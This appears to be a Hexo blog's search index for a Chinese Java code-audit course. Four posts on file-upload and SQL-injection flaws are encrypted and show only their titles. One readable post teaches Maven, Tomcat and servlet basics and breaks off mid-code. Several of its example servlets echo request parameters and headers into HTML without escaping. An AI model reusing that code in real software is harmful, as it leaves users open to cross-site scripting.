<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>JAVA代码审计-任意文件上传漏洞(进阶)</title>
    <link href="/2024/02/03/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%BF%9B%E9%98%B6/"/>
    <url>/2024/02/03/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="571c30893192e6c4d436fbcb2a17830f1ddfee5664bd597e5d6b2ce1ff2d5946"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA代码审计-任意文件上传漏洞</title>
    <link href="/2024/02/03/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/02/03/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c0c66c6245ad6292e7b30bd901cd2ae39ef5b26fa670805abc250f651e60acbf"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA代码审计-SQL注入漏洞(二)</title>
    <link href="/2024/01/08/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/"/>
    <url>/2024/01/08/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c7b49c6e7d3628fa82d019c0c9ce22ea31491d07a5e13db7087fc1536aa3fcb5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA代码审计-SQL注入漏洞(一)</title>
    <link href="/2024/01/06/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%B8%80)/"/>
    <url>/2024/01/06/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3202cca0236e39d0b106c44d0bc40f66cbbdbe20553944372970ece840db1b4a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计课程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA代码审计-JAVA WEB基础(一)</title>
    <link href="/2023/09/05/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%20WEB%E5%9F%BA%E7%A1%80(%E4%B8%80)/"/>
    <url>/2023/09/05/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-JAVA%20WEB%E5%9F%BA%E7%A1%80(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="JAVA-WEB基础-一"><a href="#JAVA-WEB基础-一" class="headerlink" title="JAVA WEB基础(一)"></a>JAVA WEB基础(一)</h1><h1 id="一、创建JAVA-WEB-项目"><a href="#一、创建JAVA-WEB-项目" class="headerlink" title="一、创建JAVA WEB 项目"></a>一、创建JAVA WEB 项目</h1><h2 id="1、创建项目"><a href="#1、创建项目" class="headerlink" title="1、创建项目"></a>1、创建项目</h2><p>新建项目:</p><p><img src="/image/image-20230720201539556.png" alt="image-20230720201539556"></p><p>选择 Maven 项目，后选择 maven-archetype-webapp ，名称处为自定义项目名，如下图所示：</p><p><img src="/image/image-20230720201931775.png" alt="image-20230720201931775"></p><p>创建成功后项目目录如下：</p><p><img src="/image/image-20230720202107106.png" alt="image-20230720202107106"></p><h2 id="2、配置Tomcat"><a href="#2、配置Tomcat" class="headerlink" title="2、配置Tomcat"></a>2、配置Tomcat</h2><p>pom.xml 添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>依赖添加成功</p><p><img src="/image/image-20230720202749599.png" alt="image-20230720202749599"></p><p>添加Tomcat</p><p><img src="/image/image-20230720202604636.png" alt="image-20230720202604636"></p><p>添加部署方式</p><p><img src="/image/image-20230720202850737.png" alt="image-20230720202850737"></p><ul><li>war方式 ：发布模式，先打包成war包，再发布。</li><li>war exploded方式 ：常在开发的时候使用这种方式，可以支持热部署。</li></ul><p>配置 url 根路径</p><p><img src="/image/image-20230720203053500.png" alt="image-20230720203053500"></p><p>启动项目</p><p><img src="/image/image-20230720203252536.png" alt="image-20230720203252536"></p><p>项目启动成功</p><p><img src="/image/image-20230720203320725.png" alt="image-20230720203320725"></p><h1 id="二、Servlet"><a href="#二、Servlet" class="headerlink" title="二、Servlet"></a>二、Servlet</h1><h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p><p>使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p><p>Java Servlet 通常情况下与使用 CGI（Common Gateway Interface，公共网关接口）实现的程序可以达到异曲同工的效果。但是相比于 CGI，Servlet 有以下几点优势：</p><ul><li>性能明显更好。</li><li>Servlet 在 Web 服务器的地址空间内执行。这样它就没有必要再创建一个单独的进程来处理每个客户端请求。</li><li>Servlet 是独立于平台的，因为它们是用 Java 编写的。</li><li>服务器上的 Java 安全管理器执行了一系列限制，以保护服务器计算机上的资源。因此，Servlet 是可信的。</li><li>Java 类库的全部功能对 Servlet 来说都是可用的。它可以通过 sockets 和 RMI 机制与 applets、数据库或其他软件进行交互。</li></ul><h2 id="2、声明-Servlet"><a href="#2、声明-Servlet" class="headerlink" title="2、声明 Servlet"></a>2、声明 Servlet</h2><h3 id="2-1、HttpServlet"><a href="#2-1、HttpServlet" class="headerlink" title="2.1、HttpServlet"></a>2.1、HttpServlet</h3><p><code>javax.servlet.http.HttpServlet</code>类继承<code>javax.servlet.GenericServlet</code>，GenericServlet实现接口<code>javax.servlet.Servlet</code>和<code>javax.servlet.ServletConfig</code>。<code>javax.servlet.Servlet</code>接口中定义了servlet基础生命周期方法：</p><ul><li>init()初始化阶段，只被调用一次，也就是在第一次创建Servlet时被调用</li><li>getServletConfig()配置</li><li>service()服务阶段，主要处理来自客户端的请求，可以根据HTTP请求类型来调用对应的方法，比如 doGet()，doPost()，doPut()等</li><li>getServletInfo()   配置</li><li>destroy()销毁阶段，该方法只会被调用一次，即在Servlet生命期结束时被调用</li></ul><p>HttpServlet不仅实现了servlet的生命周期并通过封装service方法抽象出<code>doGet()/doPost()/doDelete()/doHead()/doPut()/doOptions()/doTrace()</code>方法用于处理来自客户端的不一样的请求方式</p><p><img src="/image/image-20230720211810159.png" alt="image-20230720211810159"></p><p>综上，若声明的Servlet则只需要重写请求方法或者重写service方法即可实现servlet请求处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        writer.write(<span class="hljs-string">&quot;hello &quot;</span>+ name);<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2、xml-配置"><a href="#2-2、xml-配置" class="headerlink" title="2.2、xml 配置"></a>2.2、xml 配置</h3><p>配置 src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml 注册Servlet。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <br>  <span class="hljs-comment">&lt;!-- 绑定 HelloServlet 对应类为 org.example.HelloServlet --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.example.HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <br>  <span class="hljs-comment">&lt;!-- 绑定 HelloServlet 对应 url 地址为 /hello --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>映射匹配流程 ：&#x2F;hello 路径绑定的 Servlet-name为 HelloServlet，而 HelloServlet 绑定的class 为 org.example.HelloServlet ，访问 &#x2F;hello ，调用 org.example.HelloServlet。</p><p>配置成功，访问 &#x2F;hello ，调用 org.example.HelloServlet</p><p><img src="/image/image-20230720212335081.png" alt="image-20230720212335081"></p><h3 id="2-3、注解配置"><a href="#2-3、注解配置" class="headerlink" title="2.3、注解配置"></a>2.3、注解配置</h3><p>Servlet 3.0 之后( Tomcat7+)支持使用注解方式配置 Servlet ,在任意的Java类添加javax.servlet.annotation.WebServlet注解即可注册Servlet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebServlet(&quot;/hello1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello1Servlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        writer.write(<span class="hljs-string">&quot;hello1 &quot;</span>+ name);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置成功，访问 &#x2F;hello1 ，调用 org.example.Hello1Servlet</p><p><img src="/image/image-20230720213020959.png" alt="image-20230720213020959"></p><h2 id="3、HttpServletRequest"><a href="#3、HttpServletRequest" class="headerlink" title="3、HttpServletRequest"></a>3、HttpServletRequest</h2><h3 id="3-1、核心方法："><a href="#3-1、核心方法：" class="headerlink" title="3.1、核心方法："></a>3.1、核心方法：</h3><p>存在以下核心方法：</p><ul><li><p>String getQueryString()：得到的是完整的查询字符串，如：?a&#x3D;10&amp;b&#x3D;20获取到其中的 a&#x3D;10&amp;b&#x3D;20</p></li><li><p>Enumeration getParameterNames()：得到所有的 key，以 Enum（枚举）的方式来表示。</p></li><li><p>String getParameter(String name)：根据 key 得到 value。</p></li><li><p>String[] getParameterValues(String name)：如果存在多个 key 相同的情况下，得到的value就是一个数组的形式。</p></li><li><p>Enumeration getHeaderNames()：获取请求报头中所有的 key。</p></li><li><p>String getHeader(String name)：根据 key 获取 value。</p></li><li><p>String getCharacterEncoding()：获取到请求的字符编码是什么。（其实字符编码，就包含在 getContentType里面）</p></li><li><p>String getContentType()：获取到整个 ContentType 的键值对，值里面可能包含 字符编码。</p></li><li><p>int getContentLength()：获取到 body 的长度。</p></li><li><p>InputStream getInputStream()：得到一个输入流对象。从这个对象中读取数据，其实就是读到了请求的body。请求body里面可能有些数据，可能会被这里的 getInputStream来获取。</p></li></ul><h3 id="3-2、打印请求信息"><a href="#3-2、打印请求信息" class="headerlink" title="3.2、打印请求信息"></a>3.2、打印请求信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Enumeration;<br><br><span class="hljs-meta">@WebServlet(&quot;/showRequest&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShowRequestServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br>        <span class="hljs-comment">// 把 api 的执行结果，放到 StringBuilder 中</span><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">stringBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-comment">// 首行部分</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;h3&gt; 首行部分&lt;/h3&gt;&quot;</span>);<br>        stringBuilder.append(req.getProtocol()); <span class="hljs-comment">// 获取 版本协议</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getMethod()); <span class="hljs-comment">// 获取 请求方法</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getRequestURI()); <span class="hljs-comment">// 获取 请求路径</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getContextPath()); <span class="hljs-comment">// 获取 请求的第一级路径</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        stringBuilder.append(req.getQueryString()); <span class="hljs-comment">// 获取 完整的查询字符串</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>); <span class="hljs-comment">// 换行</span><br><br>        <span class="hljs-comment">// header 部分</span><br>        stringBuilder.append(<span class="hljs-string">&quot;&lt;h3&gt; header 部分&lt;/h3&gt;&quot;</span>);<br>        Enumeration&lt;String&gt; headerNames = req.getHeaderNames(); <span class="hljs-comment">// 获取报头中所有 key 值</span><br>        <span class="hljs-comment">// 使用迭代器方式来遍历 获取到的 header 中 key 值</span><br>        <span class="hljs-keyword">while</span> (headerNames.hasMoreElements()) &#123;<br>            <span class="hljs-comment">// 获取到 headerNames 中的一个 key 元素</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">headerName</span> <span class="hljs-operator">=</span> headerNames.nextElement();<br>            <span class="hljs-comment">// 通过 header 中 key 值，获取到对应的 value</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">headerValue</span> <span class="hljs-operator">=</span> req.getHeader(headerName);<br><br>            <span class="hljs-comment">// 将 key 和 value 组成键值对，放入 stringbuilder</span><br>            stringBuilder.append(headerName + <span class="hljs-string">&quot;: &quot;</span> + headerValue + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//在展示结果之前，需要指定浏览器的读取编码的方式，防止乱码</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>        resp.getWriter().write(stringBuilder.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>请求后如下打印相应信息：</p><p><img src="/image/image-20230720213938094.png" alt="image-20230720213938094"></p><h3 id="3-3、获取-GET-请求中参数"><a href="#3-3、获取-GET-请求中参数" class="headerlink" title="3.3、获取 GET 请求中参数"></a>3.3、获取 GET 请求中参数</h3><p>可使用getParameter()、getParameterValues()获取请求中参数。</p><ul><li>getParameter(String name)：根据 key 得到 value。</li><li>getParameterValues(String name)：如果存在多个 key 相同的情况下，得到的value就是一个数组的形式。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/getParameter&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetParameterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 我们手动从浏览器传来这样的一个请求：/getParameter/userId=1&amp;classId=2</span><br>        <span class="hljs-comment">// 这里的查询字符串 userId=1&amp;classId=2 就是键值对的结构</span><br>        <span class="hljs-comment">// 这里我们希望根据 key，拿到对应的 value</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;userId&quot;</span>); <span class="hljs-comment">// key 值需要和请求中的相匹配，才能获取对应的 value 值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">classId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;classId&quot;</span>);<br><br>        <span class="hljs-comment">// 打印数据</span><br>        resp.getWriter().write(<span class="hljs-string">&quot;userId: &quot;</span> + userId + <span class="hljs-string">&quot; classId: &quot;</span> + classId);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p> 启聪Tomcat，访问页面，得到如下结果，若有参数则输出，无参数则为 null</p><p><img src="/image/image-20230720214604747.png" alt="image-20230720214604747"></p><h3 id="3-3、获取-POST-请求中参数"><a href="#3-3、获取-POST-请求中参数" class="headerlink" title="3.3、获取 POST 请求中参数"></a>3.3、获取 POST 请求中参数</h3><p>POST 与 GET 相同仍使用 getParameter()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/postGetParameter&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PostGetParameterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 加入前端传过来的参数是 userId=1&amp;classId=2</span><br>        <span class="hljs-comment">// 此时服务器也是通过 req.getParameter 来获取参数的</span><br>        resp.setContentType(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>); <span class="hljs-comment">// 指定浏览器读取方式</span><br>        <span class="hljs-type">String</span> 